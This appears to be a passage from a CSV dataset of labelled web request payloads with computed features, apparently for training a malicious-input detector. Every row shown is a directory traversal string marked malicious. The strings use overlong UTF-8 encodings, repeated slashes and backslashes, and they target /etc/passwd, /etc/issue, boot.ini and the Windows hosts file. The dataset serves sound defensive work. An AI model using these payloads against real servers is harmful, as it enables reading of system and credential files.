,payloads,length,nonprintable_keywords,special_chars,punctuation_chars,js_events,html_tags,sql_keywords,percentage_count,spaces_count,is_malicious
20108,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25afetc%25c0%25afpasswd,295,0,86,86,0,0,0,86,0,1
20109,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25afetc%25c0%25afissue,294,0,86,86,0,0,0,86,0,1
20110,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25afboot.ini,284,0,85,85,0,0,0,84,0,1
20111,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts,346,0,92,92,0,0,0,92,0,1
20112,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd,69,0,20,20,0,0,0,20,0,1
20113,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afissue,68,0,20,20,0,0,0,20,0,1
20114,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afboot.ini,56,0,17,17,0,0,0,16,0,1
20115,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,126,0,32,32,0,0,0,32,0,1
20116,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd,117,0,36,36,0,0,0,36,0,1
20117,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afissue,116,0,36,36,0,0,0,36,0,1
20118,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afboot.ini,104,0,33,33,0,0,0,32,0,1
20119,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,174,0,48,48,0,0,0,48,0,1
20120,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd,165,0,52,52,0,0,0,52,0,1
20121,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afissue,164,0,52,52,0,0,0,52,0,1
20122,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afboot.ini,152,0,49,49,0,0,0,48,0,1
20123,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,222,0,64,64,0,0,0,64,0,1
20124,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd,213,0,68,68,0,0,0,68,0,1
20125,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afissue,212,0,68,68,0,0,0,68,0,1
20126,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afboot.ini,200,0,65,65,0,0,0,64,0,1
20127,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,270,0,80,80,0,0,0,80,0,1
20128,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd,261,0,84,84,0,0,0,84,0,1
20129,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afissue,260,0,84,84,0,0,0,84,0,1
20130,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afboot.ini,248,0,81,81,0,0,0,80,0,1
20131,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,318,0,96,96,0,0,0,96,0,1
20132,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd,309,0,100,100,0,0,0,100,0,1
20133,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afissue,308,0,100,100,0,0,0,100,0,1
20134,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afboot.ini,296,0,97,97,0,0,0,96,0,1
20135,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,366,0,112,112,0,0,0,112,0,1
20136,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd,75,0,22,22,0,0,0,22,0,1
20137,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue,74,0,22,22,0,0,0,22,0,1
20138,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afboot.ini,59,0,18,18,0,0,0,17,0,1
20139,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,141,0,37,37,0,0,0,37,0,1
20140,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd,126,0,39,39,0,0,0,39,0,1
20141,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue,125,0,39,39,0,0,0,39,0,1
20142,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afboot.ini,110,0,35,35,0,0,0,34,0,1
20143,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,192,0,54,54,0,0,0,54,0,1
20144,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd,177,0,56,56,0,0,0,56,0,1
20145,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue,176,0,56,56,0,0,0,56,0,1
20146,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afboot.ini,161,0,52,52,0,0,0,51,0,1
20147,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,243,0,71,71,0,0,0,71,0,1
20148,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd,228,0,73,73,0,0,0,73,0,1
20149,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue,227,0,73,73,0,0,0,73,0,1
20150,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afboot.ini,212,0,69,69,0,0,0,68,0,1
20151,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,294,0,88,88,0,0,0,88,0,1
20152,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd,279,0,90,90,0,0,0,90,0,1
20153,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue,278,0,90,90,0,0,0,90,0,1
20154,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afboot.ini,263,0,86,86,0,0,0,85,0,1
20155,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,345,0,105,105,0,0,0,105,0,1
20156,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd,330,0,107,107,0,0,0,107,0,1
20157,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afetc%f8%80%80%80%afissue,329,0,107,107,0,0,0,107,0,1
20158,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afboot.ini,314,0,103,103,0,0,0,102,0,1
20159,%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,396,0,122,122,0,0,0,122,0,1
20160,..//etc//passwd,15,0,6,6,0,0,0,0,0,1
20161,..//etc//issue,14,0,6,6,0,0,0,0,0,1
20162,..//boot.ini,12,0,5,5,0,0,0,0,0,1
20163,..//windows//system32//drivers//etc//hosts,42,0,12,12,0,0,0,0,0,1
20164,..//..//etc//passwd,19,0,10,10,0,0,0,0,0,1
20165,..//..//etc//issue,18,0,10,10,0,0,0,0,0,1
20166,..//..//boot.ini,16,0,9,9,0,0,0,0,0,1
20167,..//..//windows//system32//drivers//etc//hosts,46,0,16,16,0,0,0,0,0,1
20168,..//..//..//etc//passwd,23,0,14,14,0,0,0,0,0,1
20169,..//..//..//etc//issue,22,0,14,14,0,0,0,0,0,1
20170,..//..//..//boot.ini,20,0,13,13,0,0,0,0,0,1
20171,..//..//..//windows//system32//drivers//etc//hosts,50,0,20,20,0,0,0,0,0,1
20172,..//..//..//..//etc//passwd,27,0,18,18,0,0,0,0,0,1
20173,..//..//..//..//etc//issue,26,0,18,18,0,0,0,0,0,1
20174,..//..//..//..//boot.ini,24,0,17,17,0,0,0,0,0,1
20175,..//..//..//..//windows//system32//drivers//etc//hosts,54,0,24,24,0,0,0,0,0,1
20176,..//..//..//..//..//etc//passwd,31,0,22,22,0,0,0,0,0,1
20177,..//..//..//..//..//etc//issue,30,0,22,22,0,0,0,0,0,1
20178,..//..//..//..//..//boot.ini,28,0,21,21,0,0,0,0,0,1
20179,..//..//..//..//..//windows//system32//drivers//etc//hosts,58,0,28,28,0,0,0,0,0,1
20180,..//..//..//..//..//..//etc//passwd,35,0,26,26,0,0,0,0,0,1
20181,..//..//..//..//..//..//etc//issue,34,0,26,26,0,0,0,0,0,1
20182,..//..//..//..//..//..//boot.ini,32,0,25,25,0,0,0,0,0,1
20183,..//..//..//..//..//..//windows//system32//drivers//etc//hosts,62,0,32,32,0,0,0,0,0,1
20184,..///etc///passwd,17,0,8,8,0,0,0,0,0,1
20185,..///etc///issue,16,0,8,8,0,0,0,0,0,1
20186,..///boot.ini,13,0,6,6,0,0,0,0,0,1
20187,..///windows///system32///drivers///etc///hosts,47,0,17,17,0,0,0,0,0,1
20188,..///..///etc///passwd,22,0,13,13,0,0,0,0,0,1
20189,..///..///etc///issue,21,0,13,13,0,0,0,0,0,1
20190,..///..///boot.ini,18,0,11,11,0,0,0,0,0,1
20191,..///..///windows///system32///drivers///etc///hosts,52,0,22,22,0,0,0,0,0,1
20192,..///..///..///etc///passwd,27,0,18,18,0,0,0,0,0,1
20193,..///..///..///etc///issue,26,0,18,18,0,0,0,0,0,1
20194,..///..///..///boot.ini,23,0,16,16,0,0,0,0,0,1
20195,..///..///..///windows///system32///drivers///etc///hosts,57,0,27,27,0,0,0,0,0,1
20196,..///..///..///..///etc///passwd,32,0,23,23,0,0,0,0,0,1
20197,..///..///..///..///etc///issue,31,0,23,23,0,0,0,0,0,1
20198,..///..///..///..///boot.ini,28,0,21,21,0,0,0,0,0,1
20199,..///..///..///..///windows///system32///drivers///etc///hosts,62,0,32,32,0,0,0,0,0,1
20200,..///..///..///..///..///etc///passwd,37,0,28,28,0,0,0,0,0,1
20201,..///..///..///..///..///etc///issue,36,0,28,28,0,0,0,0,0,1
20202,..///..///..///..///..///boot.ini,33,0,26,26,0,0,0,0,0,1
20203,..///..///..///..///..///windows///system32///drivers///etc///hosts,67,0,37,37,0,0,0,0,0,1
20204,..///..///..///..///..///..///etc///passwd,42,0,33,33,0,0,0,0,0,1
20205,..///..///..///..///..///..///etc///issue,41,0,33,33,0,0,0,0,0,1
20206,..///..///..///..///..///..///boot.ini,38,0,31,31,0,0,0,0,0,1
20207,..///..///..///..///..///..///windows///system32///drivers///etc///hosts,72,0,42,42,0,0,0,0,0,1
20208,..\\etc\\passwd,15,0,6,6,0,0,0,0,0,1
20209,..\\etc\\issue,14,0,6,6,0,0,0,0,0,1
20210,..\\boot.ini,12,0,5,5,0,0,0,0,0,1
20211,..\\windows\\system32\\drivers\\etc\\hosts,42,0,12,12,0,0,0,0,0,1
20212,..\\..\\etc\\passwd,19,0,10,10,0,0,0,0,0,1
20213,..\\..\\etc\\issue,18,0,10,10,0,0,0,0,0,1
20214,..\\..\\boot.ini,16,0,9,9,0,0,0,0,0,1
20215,..\\..\\windows\\system32\\drivers\\etc\\hosts,46,0,16,16,0,0,0,0,0,1
20216,..\\..\\..\\etc\\passwd,23,0,14,14,0,0,0,0,0,1
20217,..\\..\\..\\etc\\issue,22,0,14,14,0,0,0,0,0,1
20218,..\\..\\..\\boot.ini,20,0,13,13,0,0,0,0,0,1
20219,..\\..\\..\\windows\\system32\\drivers\\etc\\hosts,50,0,20,20,0,0,0,0,0,1
20220,..\\..\\..\\..\\etc\\passwd,27,0,18,18,0,0,0,0,0,1
20221,..\\..\\..\\..\\etc\\issue,26,0,18,18,0,0,0,0,0,1
20222,..\\..\\..\\..\\boot.ini,24,0,17,17,0,0,0,0,0,1
20223,..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts,54,0,24,24,0,0,0,0,0,1
20224,..\\..\\..\\..\\..\\etc\\passwd,31,0,22,22,0,0,0,0,0,1
20225,..\\..\\..\\..\\..\\etc\\issue,30,0,22,22,0,0,0,0,0,1
20226,..\\..\\..\\..\\..\\boot.ini,28,0,21,21,0,0,0,0,0,1
20227,..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts,58,0,28,28,0,0,0,0,0,1
20228,..\\..\\..\\..\\..\\..\\etc\\passwd,35,0,26,26,0,0,0,0,0,1
20229,..\\..\\..\\..\\..\\..\\etc\\issue,34,0,26,26,0,0,0,0,0,1
20230,..\\..\\..\\..\\..\\..\\boot.ini,32,0,25,25,0,0,0,0,0,1
20231,..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts,62,0,32,32,0,0,0,0,0,1
20232,..\\\etc\\\passwd,17,0,8,8,0,0,0,0,0,1
20233,..\\\etc\\\issue,16,0,8,8,0,0,0,0,0,1
20234,..\\\boot.ini,13,0,6,6,0,0,0,0,0,1
20235,..\\\windows\\\system32\\\drivers\\\etc\\\hosts,47,0,17,17,0,0,0,0,0,1
20236,..\\\..\\\etc\\\passwd,22,0,13,13,0,0,0,0,0,1
20237,..\\\..\\\etc\\\issue,21,0,13,13,0,0,0,0,0,1
20238,..\\\..\\\boot.ini,18,0,11,11,0,0,0,0,0,1
20239,..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts,52,0,22,22,0,0,0,0,0,1
20240,..\\\..\\\..\\\etc\\\passwd,27,0,18,18,0,0,0,0,0,1
20241,..\\\..\\\..\\\etc\\\issue,26,0,18,18,0,0,0,0,0,1
20242,..\\\..\\\..\\\boot.ini,23,0,16,16,0,0,0,0,0,1
20243,..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts,57,0,27,27,0,0,0,0,0,1
20244,..\\\..\\\..\\\..\\\etc\\\passwd,32,0,23,23,0,0,0,0,0,1
20245,..\\\..\\\..\\\..\\\etc\\\issue,31,0,23,23,0,0,0,0,0,1
20246,..\\\..\\\..\\\..\\\boot.ini,28,0,21,21,0,0,0,0,0,1
20247,..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts,62,0,32,32,0,0,0,0,0,1
20248,..\\\..\\\..\\\..\\\..\\\etc\\\passwd,37,0,28,28,0,0,0,0,0,1
20249,..\\\..\\\..\\\..\\\..\\\etc\\\issue,36,0,28,28,0,0,0,0,0,1
20250,..\\\..\\\..\\\..\\\..\\\boot.ini,33,0,26,26,0,0,0,0,0,1
20251,..\\\..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts,67,0,37,37,0,0,0,0,0,1
20252,..\\\..\\\..\\\..\\\..\\\..\\\etc\\\passwd,42,0,33,33,0,0,0,0,0,1
20253,..\\\..\\\..\\\..\\\..\\\..\\\etc\\\issue,41,0,33,33,0,0,0,0,0,1
20254,..\\\..\\\..\\\..\\\..\\\..\\\boot.ini,38,0,31,31,0,0,0,0,0,1
20255,..\\\..\\\..\\\..\\\..\\\..\\\windows\\\system32\\\drivers\\\etc\\\hosts,72,0,42,42,0,0,0,0,0,1
20256,../\etc/\passwd,15,0,6,6,0,0,0,0,0,1
20257,../\etc/\issue,14,0,6,6,0,0,0,0,0,1
20258,../\boot.ini,12,0,5,5,0,0,0,0,0,1
20259,../\windows/\system32/\drivers/\etc/\hosts,42,0,12,12,0,0,0,0,0,1
20260,../\../\etc/\passwd,19,0,10,10,0,0,0,0,0,1
